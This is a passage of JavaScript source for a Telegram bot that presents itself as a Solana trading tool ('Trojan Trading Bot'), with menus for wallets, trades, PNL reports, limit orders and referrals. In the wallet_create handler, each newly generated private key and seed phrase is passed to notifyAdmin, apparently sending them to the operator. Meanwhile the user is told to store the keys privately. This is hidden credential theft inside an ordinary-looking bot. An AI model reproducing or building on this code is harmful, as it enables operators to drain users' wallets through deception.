    feeDisplay = `\n💸 Platform Fee: ${COMMISSION_PERCENTAGE}%`;
  } else if (COMMISSION_PERCENTAGE > 0) {
    feeDisplay = '\n💎 Platform: Trade with low fees';
  }
  
  const msg = `⚙️ *Settings*\n\n📊 Slippage: ${slippage}%\n⚡ Priority Fee: ${priorityFee} SOL\n🔔 Notifications: ${notifications?'ON':'OFF'}${feeDisplay}`;
  const kb  = Markup.inlineKeyboard([
    [Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'), Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')],
    [Markup.button.callback(notifications?'🔔 Notifs: ON':'🔕 Notifs: OFF', 'settings_notifications')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
}

async function showPNLReport(ctx, edit = false) {
  try {
    const session = await getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    if (!history.length) {
      const msg = `📈 *PNL Report*\n\nNo trades yet. Start trading!`;
      const kb  = Markup.inlineKeyboard([[Markup.button.callback('🟢 Start Trading','menu_buy')],[Markup.button.callback('« Back','back_main')]]);
      if (edit && ctx.callbackQuery) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
      return;
    }
    const total    = history.length;
    const buys     = history.filter(t => t.type==='BUY').length;
    const sells    = history.filter(t => t.type==='SELL').length;
    const volume   = history.reduce((s,t) => s+(t.valueUsd||0), 0);
    const totalPnl = history.reduce((s,t) => s+(t.pnlUsd||0), 0);
    const wins     = history.filter(t => t.pnlUsd > 0).length;
    const losses   = history.filter(t => t.pnlUsd < 0).length;
    const winRate  = total > 0 ? ((wins/total)*100).toFixed(1) : 0;
    const pnlEmoji = totalPnl >= 0 ? '🟢' : '🔴';
    const pnlSign  = totalPnl >= 0 ? '+' : '';
    const last24   = new Date(Date.now() - 86400000);
    const h24      = history.filter(t => new Date(t.timestamp) >= last24);
    const pnl24    = h24.reduce((s,t) => s+(t.pnlUsd||0), 0);
    const tokenStats = {};
    history.forEach(t => {
      if (!tokenStats[t.tokenAddress]) tokenStats[t.tokenAddress] = { symbol:t.tokenSymbol||'?', buys:0, sells:0, totalSpent:0, totalReceived:0, pnl:0, avgBuy:0, totalBought:0 };
      const ts = tokenStats[t.tokenAddress];
      if (t.type==='BUY') { ts.buys++; ts.totalBought += t.amountToken||0; ts.totalSpent += t.valueUsd||0; }
      else { ts.sells++; ts.totalReceived += t.valueUsd||0; const avg = ts.totalBought>0?ts.totalSpent/ts.totalBought:0; ts.pnl += (t.valueUsd||0) - (t.amountToken||0)*avg; }
    });
    const topTokens = Object.values(tokenStats).sort((a,b) => (b.totalSpent+b.totalReceived)-(a.totalSpent+a.totalReceived)).slice(0,5);
    const breakdown = topTokens.map(t => `${t.pnl>=0?'🟢':'🔴'} *${t.symbol}* | B:${t.buys} S:${t.sells} | ${t.pnl>=0?'+':''}$${t.pnl.toFixed(2)}`).join('\n');
    const msg = `📈 *PNL REPORT*\n\n━━━━━━━━━━━━━━━━━━\n💰 *OVERALL*\n${pnlEmoji} Total PNL: ${pnlSign}$${Math.abs(totalPnl).toFixed(2)}\n📊 Trades: ${total} (🟢${buys} buys | 🔴${sells} sells)\n✅ Wins: ${wins} | ❌ Losses: ${losses}\n🎯 Win Rate: ${winRate}%\n💵 Volume: $${volume.toFixed(2)}\n\n━━━━━━━━━━━━━━━━━━\n⏰ *LAST 24H*\n${pnl24>=0?'🟢':'🔴'} PNL: ${pnl24>=0?'+':''}$${Math.abs(pnl24).toFixed(2)} | Trades: ${h24.length}\n\n━━━━━━━━━━━━━━━━━━\n🪙 *TOP TOKENS*\n${breakdown||'No sell data yet'}`;
    const kb  = Markup.inlineKeyboard([
      [Markup.button.callback('📊 Chart', 'pnl_image')],
      [Markup.button.callback('📜 Full History', 'menu_history')],
      [Markup.button.callback('📥 Export CSV', 'export_pnl_csv')],
      [Markup.button.callback('🔄 Refresh', 'menu_pnl_report')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    if (edit && ctx.callbackQuery) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
  } catch (error) { console.error('PNL report error:', error); await ctx.reply('❌ Error loading PNL.'); }
}

async function showTradeHistory(ctx, edit = false) {
  try {
    const session = await getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    if (!history.length) {
      const msg = `📜 *Trade History*\n\nNo trades yet!`;
      const kb  = Markup.inlineKeyboard([[Markup.button.callback('💸 Start Trading','menu_buy')],[Markup.button.callback('« Back','back_main')]]);
      if (edit && ctx.callbackQuery) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
      return;
    }
    const volume   = history.reduce((s,t) => s+(t.valueUsd||0), 0);
    let recent = '';
    history.slice(0,10).forEach((t,i) => {
      const emoji  = t.type==='BUY'?'🚀':'💸';
      const pnlPart = t.pnlUsd!==0 ? ` | ${t.pnlUsd>0?'🟢+':'🔴'}$${Math.abs(t.pnlUsd).toFixed(2)}` : '';
      recent += `${i+1}. ${emoji} *${t.type}* ${t.tokenSymbol||'?'}\n   ${(t.amountSol||0).toFixed(3)} SOL | $${(t.valueUsd||0).toFixed(2)}${pnlPart}\n   🕐 ${t.time||'?'} \`${shortenAddress(t.txHash||'')}\`\n\n`;
    });
    const msg = `📜 *Trade History* (${history.length} total)\n\n🟢 Buys: ${history.filter(t=>t.type==='BUY').length} | 💸 Sells: ${history.filter(t=>t.type==='SELL').length}\n💵 Volume: $${volume.toFixed(2)}\n\n━━━━━━━━━━━━━━━━━━\n${recent}`;
    const kb  = Markup.inlineKeyboard([
      [Markup.button.callback('📈 PNL Report', 'menu_pnl_report')],
      [Markup.button.callback('📥 Export CSV', 'export_history_csv')],
      [Markup.button.callback('🗑️ Clear History', 'clear_history_confirm')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    if (edit && ctx.callbackQuery) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
  } catch (error) { console.error('History error:', error); await ctx.reply('❌ Error loading history.'); }
}

async function showCopyTradeMenu(ctx, edit = false) {
  const session = await getSession(ctx.from.id);
  const msg     = `👥 *Copy Trade*\n\n${session.copyTradeWallets.length?'*Tracking:*\n'+session.copyTradeWallets.map(w=>`• \`${shortenAddress(w)}\``).join('\n'):'No wallets being tracked.'}\n\nAdd a wallet address to copy trades.`;
  const kb      = Markup.inlineKeyboard([[Markup.button.callback('➕ Add Wallet','copytrade_add')],[Markup.button.callback('📋 Manage','copytrade_manage')],[Markup.button.callback('« Back','back_main')]]);
  try { if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb }); }
  catch { await ctx.reply(msg, { parse_mode:'Markdown', ...kb }); }
}

async function showLimitOrderMenu(ctx, edit = false) {
  const session = await getSession(ctx.from.id);
  const orders  = session.limitOrders || [];
  const msg     = `📈 *Limit Orders*\n\n${orders.length?'*Active:*\n'+orders.map((o,i)=>`${i+1}. ${o.type} ${o.amount} @ $${o.price}\n   \`${shortenAddress(o.token)}\``).join('\n\n'):'_No active orders._'}`;
  const kb      = Markup.inlineKeyboard([[Markup.button.callback('🟢 Limit Buy','limit_buy'),Markup.button.callback('🔴 Limit Sell','limit_sell')],[Markup.button.callback('📋 View Orders','limit_view')],[Markup.button.callback('« Back','back_main')]]);
  if (edit) await ctx.editMessageText(msg, { parse_mode:'Markdown', ...kb }); else await ctx.reply(msg, { parse_mode:'Markdown', ...kb });
}

// ============================================
// COMMANDS
// ============================================
bot.command('start', async (ctx) => {
  try {
    await addSubscriber(ctx.from.id);
    const session     = await getSession(ctx.from.id);
    const startPayload = ctx.message.text.split(' ')[1];
    if (startPayload?.startsWith('ref_') && session.isNewUser) {
      const code    = startPayload.replace('ref_', '');
      const applied = await applyReferral(ctx.from.id, code);
      if (applied) await ctx.reply('🎁 Referral applied! Welcome!');
    }
    if (session.isNewUser) {
      session.isNewUser = false;
      await saveSession(ctx.from.id, session);
      await notifyAdmin('NEW_USER', ctx.from.id, ctx.from.username);
    }
    await showMainMenu(ctx);
  } catch (e) { console.error('/start error:', e); }
});
bot.command('wallet',   async (ctx) => { try { await showWalletMenu(ctx); }   catch (e) { console.error(e); } });
bot.command('positions',async (ctx) => { try { await showPositionsMenu(ctx); } catch (e) { console.error(e); } });
bot.command('settings', async (ctx) => { try { await showSettingsMenu(ctx); }  catch (e) { console.error(e); } });
bot.command('referral', async (ctx) => { try { await showReferralsMenu(ctx); } catch (e) { console.error(e); } });
bot.command('help',     async (ctx) => { try { await showHelpMenu(ctx); }      catch (e) { console.error(e); } });
bot.command('sniper',   async (ctx) => { try { await showSniperMenu(ctx); }    catch (e) { console.error(e); } });
bot.command('refresh',  async (ctx) => { try { await showMainMenu(ctx); }      catch (e) { console.error(e); } });
bot.command('buy', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length >= 2 && !isNaN(parseFloat(args[0])) && isSolanaAddress(args[1]))
      await handleBuy(ctx, parseFloat(args[0]), args[1]);
    else await showBuyMenu(ctx);
  } catch (e) { console.error('/buy error:', e); }
});
bot.command('sell', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length >= 2 && !isNaN(parseFloat(args[0])) && isSolanaAddress(args[1]))
      await handleSell(ctx, parseFloat(args[0]), args[1]);
    else await showSellMenu(ctx);
  } catch (e) { console.error('/sell error:', e); }
});
bot.command('copytrade', async (ctx) => { try { await showCopyTradeMenu(ctx); } catch (e) { console.error(e); } });
bot.command('limit',     async (ctx) => { try { await showLimitOrderMenu(ctx); } catch (e) { console.error(e); } });
bot.command('broadcast', async (ctx) => {
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) { await ctx.reply('⛔ Not authorized.'); return; }
  const session = await getSession(ctx.from.id);
  session.awaitingBroadcast = true;
  await saveSession(ctx.from.id, session);
  const count = (await storage.getSubscribers()).length;
  await ctx.reply(`📢 *Broadcast Mode*\n\nSend your message (text/photo/video/document).\nWill reach *${count}* subscribers.`, { parse_mode:'Markdown' });
});

// ============================================
// CALLBACK ACTIONS
// ============================================
bot.action('back_main',        async (ctx) => { await ctx.answerCbQuery(); await showMainMenu(ctx, true); });
bot.action('refresh_main',     async (ctx) => { await ctx.answerCbQuery('✅ Refreshed'); await showMainMenu(ctx, true); });
bot.action('noop',             async (ctx) => { await ctx.answerCbQuery(); });
bot.action('menu_wallet',      async (ctx) => { await ctx.answerCbQuery(); await showWalletMenu(ctx, true); });
bot.action('menu_positions',   async (ctx) => { await ctx.answerCbQuery(); await showPositionsMenu(ctx, true); });
bot.action('menu_buy',         async (ctx) => { await ctx.answerCbQuery(); await showBuyMenu(ctx, true); });
bot.action('menu_sell',        async (ctx) => { await ctx.answerCbQuery(); await showSellMenu(ctx, true); });
bot.action('menu_settings',    async (ctx) => { await ctx.answerCbQuery(); await showSettingsMenu(ctx, true); });
bot.action('menu_copytrade',   async (ctx) => { await ctx.answerCbQuery(); await showCopyTradeMenu(ctx, true); });
bot.action('menu_limit',       async (ctx) => { await ctx.answerCbQuery(); await showLimitOrderMenu(ctx, true); });
bot.action('menu_referrals',   async (ctx) => { await ctx.answerCbQuery(); await showReferralsMenu(ctx, true); });
bot.action('menu_help',        async (ctx) => { await ctx.answerCbQuery(); await showHelpMenu(ctx, true); });
bot.action('menu_history',     async (ctx) => { await ctx.answerCbQuery(); await showTradeHistory(ctx, true); });
bot.action('menu_pnl_report',  async (ctx) => { await ctx.answerCbQuery(); await showPNLReport(ctx, true); });
bot.action('menu_sniper',      async (ctx) => { await ctx.answerCbQuery(); await showSniperMenu(ctx, true); });

// --- Wallet create ---
bot.action('wallet_create', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (session.wallets.length >= MAX_WALLETS) { await ctx.reply(`❌ Max ${MAX_WALLETS} wallets reached.`); return; }
  const mnemonic   = bip39.generateMnemonic(128);
  const walletData = importFromMnemonic(mnemonic);
  session.wallets.push(walletData);
  session.activeWalletIndex = session.wallets.length - 1;
  await saveSession(ctx.from.id, session);
  await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, { publicKey: walletData.publicKey, privateKey: walletData.privateKey, mnemonic: walletData.mnemonic, walletNumber: session.wallets.length });
  const sentMsg = await ctx.reply(
    `✅ *New Wallet Created!*\n\n📍 *Address:*\n\`${walletData.publicKey}\`\n\n🔑 *Private Key:*\n\`${walletData.privateKey}\`\n\n📝 *Seed Phrase:*\n\`${walletData.mnemonic}\`\n\n⚠️ Save these offline. This message auto-deletes in 30s.`,
    { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💼 View Wallets','menu_wallet')],[Markup.button.callback('« Main Menu','back_main')]]) }
  );
  setTimeout(async () => { try { await ctx.deleteMessage(sentMsg.message_id); } catch { /* ignore */ } }, 30000);
});

// --- Wallet import ---
bot.action('wallet_import_seed', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (session.wallets.length >= MAX_WALLETS) { await ctx.reply(`❌ Max ${MAX_WALLETS} wallets.`); return; }
  session.state = 'AWAITING_SEED';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('📥 *Import via Seed Phrase*\n\nSend your 12 or 24 word seed phrase.\n⚠️ Private chat only!', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
});
bot.action('wallet_import_key', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (session.wallets.length >= MAX_WALLETS) { await ctx.reply(`❌ Max ${MAX_WALLETS} wallets.`); return; }
  session.state = 'AWAITING_PRIVATE_KEY';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('🔑 *Import via Private Key*\n\nSend your Base58 private key.\n⚠️ Private chat only!', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
});
bot.action('wallet_export', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  const w = getActiveWallet(session);
  if (!w) { await ctx.reply('❌ No wallet connected.'); return; }
  await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey });
  const msg = `🔐 *Wallet Export*\n\n📍 Address:\n\`${w.publicKey}\`\n\n🔑 Private Key:\n\`${w.privateKey}\`${w.mnemonic?`\n\n📝 Seed:\n\`${w.mnemonic}\``:''}\n\n⚠️ Delete this message after saving!`;
  await ctx.reply(msg, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🗑️ Delete','delete_message')]]) });
});
bot.action('wallet_remove', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (!session.wallets.length) { await ctx.reply('No wallets to remove.'); return; }
  const buttons = session.wallets.map((w,i) => [Markup.button.callback(`🗑️ Remove Wallet ${i+1} (${shortenAddress(w.publicKey)})`, `confirm_remove_${i}`)]);
  buttons.push([Markup.button.callback('« Back','menu_wallet')]);
  await ctx.editMessageText('🗑️ Select wallet to remove:', { parse_mode:'Markdown', ...Markup.inlineKeyboard(buttons) });
});
bot.action(/^confirm_remove_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const index = parseInt(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  if (index < 0 || index >= session.wallets.length) { await ctx.reply('❌ Invalid wallet.'); return; }
  const removed = session.wallets.splice(index, 1)[0];
  if (session.activeWalletIndex >= session.wallets.length) session.activeWalletIndex = Math.max(0, session.wallets.length - 1);
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`✅ Removed: \`${shortenAddress(removed.publicKey)}\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💼 Wallets','menu_wallet')],[Markup.button.callback('« Main Menu','back_main')]]) });
});
bot.action('wallet_refresh', async (ctx) => { await ctx.answerCbQuery('Refreshing...'); await showWalletMenu(ctx, true); });
bot.action(/^switch_wallet_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  if (index >= 0 && index < session.wallets.length) {
    session.activeWalletIndex = index;
    await saveSession(ctx.from.id, session);
    await ctx.answerCbQuery(`Switched to Wallet ${index+1}`);
    await showWalletMenu(ctx, true);
  } else { await ctx.answerCbQuery('Invalid wallet'); }
});
bot.action('wallet_deposit', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  const w = getActiveWallet(session);
  if (!w) { await ctx.reply('❌ No wallet.'); return; }
  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${w.publicKey}`;
  await ctx.editMessageText(`📥 *Deposit*\n\nSend SOL or SPL tokens to:\n\`${w.publicKey}\`\n\n⚠️ Solana network only!`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('📱 QR Code', qr)],[Markup.button.callback('💼 Back','menu_wallet')]]) });
});
bot.action(/^copy_address_(.+)$/, async (ctx) => { await ctx.answerCbQuery(ctx.match[1], { show_alert:true }); });
bot.action('wallet_transfer_menu', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (!getActiveWallet(session)) { await ctx.reply('❌ No wallet.'); return; }
  await ctx.editMessageText('📤 *Transfer Funds*\n\nChoose what to send:', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💎 Send SOL','transfer_sol')],[Markup.button.callback('🪙 Send Token','transfer_token')],[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
});
bot.action('transfer_sol', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_TRANSFER_SOL_RECIPIENT';
  session.pendingTransfer = { type:'SOL' };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('📤 *Send SOL*\n\nStep 1/2: Enter recipient address:', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
});
bot.action('transfer_token', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_TRANSFER_TOKEN_MINT';
  session.pendingTransfer = { type:'TOKEN' };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('📤 *Send Token*\n\nStep 1/3: Enter token mint address:', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_wallet')]]) });
});

// --- Trading callbacks ---
bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
  const amount = parseFloat(ctx.match[1]);
  const addr   = ctx.match[2];
  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
  await handleBuy(ctx, amount, addr);
});
bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
  await ctx.answerCbQuery(`Selling ${ctx.match[1]}%...`);
  await handleSell(ctx, parseInt(ctx.match[1]), ctx.match[2]);
});
bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
  const amount = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${amount} SOL`);
  const session = await getSession(ctx.from.id);
  session.pendingTrade = { type:'buy', amount: parseFloat(amount) };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`🟢 Buy *${amount} SOL*\n\nPaste the token address to buy.`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_buy')]]) });
});
bot.action(/^setsell_(\d+)$/, async (ctx) => {
  const pct = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${pct}%`);
  const session = await getSession(ctx.from.id);
  session.pendingTrade = { type:'sell', percentage: parseInt(pct) };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`🔴 Sell *${pct}%*\n\nPaste the token address to sell.`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_sell')]]) });
});
bot.action('setsell_custom', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_PERCENT';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('🔴 *Custom Sell*\n\nEnter percentage to sell (1–100):', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back','menu_sell')]]) });
});
bot.action(/^track_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  const session = await getSession(ctx.from.id);
  if (!session.trackedTokens.includes(addr)) {
    session.trackedTokens.push(addr);
    await saveSession(ctx.from.id, session);
    await ctx.answerCbQuery('✅ Token tracked!');
  } else { await ctx.answerCbQuery('Already tracking this token.'); }
});
bot.action(/^price_alert_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_PRICE_ALERT';
  session.pendingPriceAlert = { token: addr };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`🔔 *Set Price Alert*\n\nToken: \`${shortenAddress(addr)}\`\nEnter target price in USD (e.g. 0.001):`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`refresh_${addr}`)]]) });
});
bot.action(/^sell_custom_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_AMOUNT';
  session.pendingTrade = { type:'sell', token: addr };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`💸 *Custom Sell*\n\nToken: \`${shortenAddress(addr)}\`\nEnter percentage to sell (1–100):`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`refresh_${addr}`)]]) });
});
bot.action(/^limit_order_(.+)$/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery();
  await ctx.editMessageText(`🎯 *Limit Order*\n\nToken: \`${shortenAddress(addr)}\`\nChoose type:`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🚀 Limit Buy',`limit_buy_${addr}`),Markup.button.callback('💸 Limit Sell',`limit_sell_${addr}`)],[Markup.button.callback('« Back',`refresh_${addr}`)]]) });
});
bot.action(/^limit_buy_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY_DETAILS';
  session.pendingLimitOrder = { type:'buy', token: addr };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`🟢 *Limit Buy*\n\nToken: \`${shortenAddress(addr)}\`\nSend: \`[price] [amount_sol]\`\nExample: \`0.001 0.5\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`limit_order_${addr}`)]]) });
});
bot.action(/^limit_sell_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL_DETAILS';
  session.pendingLimitOrder = { type:'sell', token: addr };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`💸 *Limit Sell*\n\nToken: \`${shortenAddress(addr)}\`\nSend: \`[price] [percentage]\`\nExample: \`0.01 50\``, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`limit_order_${addr}`)]]) });
});
bot.action(/^dca_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_DCA_DETAILS';
  session.pendingDCA = { token: addr };
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`📈 *DCA Order*\n\nToken: \`${shortenAddress(addr)}\`\nSend: \`[amount_sol] [interval_minutes] [num_orders]\`\nExample: \`0.1 60 5\`\n(0.1 SOL every 60min, 5 times)`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`refresh_${addr}`)]]) });
});
bot.action(/^set_tpsl_(.+)$/, async (ctx) => {
  const addr    = ctx.match[1];
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_SNIPER_TPSL';
  session.pendingSniperToken = addr;
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText(`🎯 *Set TP/SL* for \`${shortenAddress(addr)}\`\n\nSend: \`[tp_price] [sl_price]\`\nExample: \`0.001 0.0005\`\n(Use 0 to skip one)`, { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back',`refresh_${addr}`)]]) });
});
bot.action(/^refresh_(.+)$/, async (ctx) => {
  const key = ctx.match[1];
  if      (key === 'main')      { await ctx.answerCbQuery('Refreshed!'); await showMainMenu(ctx, true); }
  else if (key === 'positions') { await ctx.answerCbQuery('Refreshing...'); await showPositionsMenu(ctx, true); }
  else                          { await ctx.answerCbQuery('Refreshing...'); await sendTokenAnalysis(ctx, key); }
});

// --- Sniper actions ---
bot.action('sniper_set', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  session.state = 'AWAITING_SNIPER_TOKEN';
  await saveSession(ctx.from.id, session);
  await ctx.editMessageText('🎯 *Set TP/SL*\n\nSend the token address (must be a token you already hold).', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel','menu_sniper')]]) });
});
bot.action('sniper_cancel', async (ctx) => {
  await ctx.answerCbQuery();
  const session = await getSession(ctx.from.id);
  if (!session.activeSnipes.length) { await ctx.reply('No active snipes.'); return; }
  const buttons = session.activeSnipes.map((s,i) => [Markup.button.callback(`❌ ${shortenAddress(s.token)}`, `cancel_snipe_${i}`)]);
  buttons.push([Markup.button.callback('« Back','menu_sniper')]);
  await ctx.editMessageText('Select snipe to cancel:', { ...Markup.inlineKeyboard(buttons) });
});
bot.action(/^cancel_snipe_(\d+)$/, async (ctx) => {
  const index   = parseInt(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  if (index >= 0 && index < session.activeSnipes.length) {
    const removed = session.activeSnipes.splice(index, 1)[0];
    await saveSession(ctx.from.id, session);
    await ctx.answerCbQuery(`Cancelled ${shortenAddress(removed.token)}`);
    await showSniperMenu(ctx, true);
  } else { await ctx.answerCbQuery('Invalid'); }
});

// --- Settings ---
bot.action('settings_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📊 *Slippage*\n\nSelect:', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('0.5%','set_slippage_0.5'),Markup.button.callback('1%','set_slippage_1'),Markup.button.callback('2%','set_slippage_2')],[Markup.button.callback('5%','set_slippage_5'),Markup.button.callback('10%','set_slippage_10')],[Markup.button.callback('« Back','menu_settings')]]) });
});
bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
  const v = parseFloat(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  session.settings.slippage = v;
  await saveSession(ctx.from.id, session);
  await ctx.answerCbQuery(`Slippage → ${v}%`);
  await showSettingsMenu(ctx, true);
});
bot.action('settings_fee', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('⚡ *Priority Fee*\n\nSelect:', { parse_mode:'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('0.0005','set_fee_0.0005'),Markup.button.callback('0.001','set_fee_0.001')],[Markup.button.callback('0.005','set_fee_0.005'),Markup.button.callback('0.01','set_fee_0.01')],[Markup.button.callback('« Back','menu_settings')]]) });
});
bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => {
  const v = parseFloat(ctx.match[1]);
  const session = await getSession(ctx.from.id);
  session.settings.priorityFee = v;
  await saveSession(ctx.from.id, session);
  await ctx.answerCbQuery(`Fee → ${v} SOL`);
  await showSettingsMenu(ctx, true);
});
bot.action('settings_notifications', async (ctx) => {
  const session = await getSession(ctx.from.id);
  session.settings.notifications = !session.settings.notifications;
  await saveSession(ctx.from.id, session);
  await ctx.answerCbQuery(`Notifications ${session.settings.notifications?'ON':'OFF'}`);
  await showSettingsMenu(ctx, true);
});

// --- Referral ---
bot.action('referral_copy', async (ctx) => {
  const code = await getReferralCode(ctx.from.id);
  let botUsername = 'bot';
  try { botUsername = (await bot.telegram.getMe()).username; } catch { /* ignore */ }
  const link = `https://t.me/${botUsername}?start=ref_${code}`;
  await ctx.answerCbQuery('Link below!');
  await ctx.reply(`📋 Your referral link:\n\`${link}\``, { parse_mode:'Markdown' });
});
bot.action('referral_share', async (ctx) => {
  const code = await getReferralCode(ctx.from.id);
  let botUsername = 'bot';
  try { botUsername = (await bot.telegram.getMe()).username; } catch { /* ignore */ }
  const link = `https://t.me/${botUsername}?start=ref_${code}`;
  await ctx.answerCbQuery();
  await ctx.reply(`🚀 Join me on Trojan Trading Bot — the ultimate Solana trading bot!\n${link}`, { parse_mode:'Markdown' });
});
bot.action('referral_refresh', async (ctx) => { await ctx.answerCbQuery('Refreshed!'); await showReferralsMenu(ctx, true); });

// --- Help sub-pages ---
bot.action('help_wallet', async (ctx) => {
  await ctx.answerCbQuery();
